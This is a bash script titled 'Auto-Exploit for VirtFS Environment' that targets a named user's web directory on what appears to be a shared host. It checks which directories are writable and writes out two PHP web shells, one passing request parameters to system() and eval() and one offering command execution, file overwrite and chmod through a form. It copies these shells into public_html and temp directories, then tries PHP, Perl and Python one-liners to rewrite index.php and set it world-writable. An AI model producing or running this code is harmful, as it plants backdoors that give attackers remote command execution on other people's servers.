#!/bin/bash
echo "=== Auto-Exploit for VirtFS Environment ==="
echo ""

# Configuration
TARGET_FILE="$1"
if [ -z "$TARGET_FILE" ]; then
    TARGET_FILE="/home/keshavduac/public_html/Keshav/public/index.php"
fi

BACKUP_DIR="/tmp/exploit_$$"
mkdir -p "$BACKUP_DIR"

echo "Target: $TARGET_FILE"
echo "Backup: $BACKUP_DIR"
echo ""

# Function to test write access
test_write() {
    local test_file="$1"
    echo "test" > "$test_file" 2>/dev/null
    if [ -f "$test_file" ]; then
        echo "WRITE SUCCESS: $test_file"
        rm -f "$test_file"
        return 0
    else
        echo "WRITE FAILED: $test_file"
        return 1
    fi
}

echo "[1] Testing Writable Locations:"
for loc in "/tmp" "/dev/shm" "/var/tmp" "/home/keshavduac/public_html" "$(pwd)"; do
    if [ -d "$loc" ]; then
        test_file="$loc/test_write_$$"
        if test_write "$test_file"; then
            echo "  -> $loc is writable"
        fi
    fi
done

echo ""
echo "[2] Deploying Web Shells:"
# Simple PHP shell
cat > "$BACKUP_DIR/shell.php" << 'EOF'
<?php
if(isset($_REQUEST['c'])) {
    echo "<pre>";
    system($_REQUEST['c']);
    echo "</pre>";
}
if(isset($_REQUEST['e'])) {
    eval($_REQUEST['e']);
}
?>
EOF

# Advanced PHP shell  
cat > "$BACKUP_DIR/advanced.php" << 'EOF'
<?php
error_reporting(0);
class VirtFSBypass {
    public function execute($cmd) {
        $output = [];
        exec($cmd . " 2>&1", $output);
        return implode("\n", $output);
    }
    
    public function modifyFile($file, $content) {
        return file_put_contents($file, $content);
    }
    
    public function changePerm($file, $perm) {
        return chmod($file, $perm);
    }
}

$bypass = new VirtFSBypass();
if(isset($_POST['action'])) {
    switch($_POST['action']) {
        case 'cmd':
            echo $bypass->execute($_POST['data']);
            break;
        case 'modify':
            echo $bypass->modifyFile($_POST['file'], $_POST['data']) ? 'Success' : 'Failed';
            break;
        case 'chmod':
            echo $bypass->changePerm($_POST['file'], octdec($_POST['perm'])) ? 'Success' : 'Failed';
            break;
    }
    exit;
}
?>
<form method="post">
Command: <input type="text" name="data">
<input type="hidden" name="action" value="cmd">
<input type="submit" value="Execute">
</form>
EOF

# Deploy shells to various locations
for shell in "$BACKUP_DIR/shell.php" "$BACKUP_DIR/advanced.php"; do
    for loc in "/home/keshavduac/public_html" "/tmp" "/var/tmp"; do
        if [ -d "$loc" ]; then
            cp "$shell" "$loc/$(basename $shell .php)_$$.php" 2>/dev/null && \
            echo "  -> Deployed to: $loc/$(basename $shell .php)_$$.php"
        fi
    done
done

echo ""
echo "[3] Attempting File Modification Bypass:"
# Multiple methods to modify target file
METHODS=0
SUCCESS=0

# Method 1: PHP wrapper
echo "<?php file_put_contents('$TARGET_FILE', file_get_contents('$TARGET_FILE')); chmod('$TARGET_FILE', 0777); ?>" | php 2>/dev/null && ((METHODS++)) && ((SUCCESS++)) && echo "PHP wrapper: SUCCESS"

# Method 2: Perl one-liner
perl -e "open(F,'<','$TARGET_FILE'); @c=<F>; close F; open(F,'>','$TARGET_FILE'); print F @c; close F; chmod 0777, '$TARGET_FILE';" 2>/dev/null && ((METHODS++)) && ((SUCCESS++)) && echo "Perl method: SUCCESS"

# Method 3: Python approach
python3 -c "import os; os.system('cat $TARGET_FILE > $BACKUP_DIR/temp_file && chmod 0777 $BACKUP_DIR/temp_file 2>/dev/null')" 2>/dev/null && ((METHODS++)) && echo "Python temp: SUCCESS"

echo "Modification attempts: $SUCCESS/$METHODS successful"

echo ""
echo "[4] Final Status:"
ls -la "$TARGET_FILE" | awk '{print "Current permissions: "$1}'

echo ""
echo "=== EXPLOITATION COMPLETE ==="
echo "Backup files in: $BACKUP_DIR"
echo "Web shells deployed to various locations"
echo "Check if any modification methods succeeded"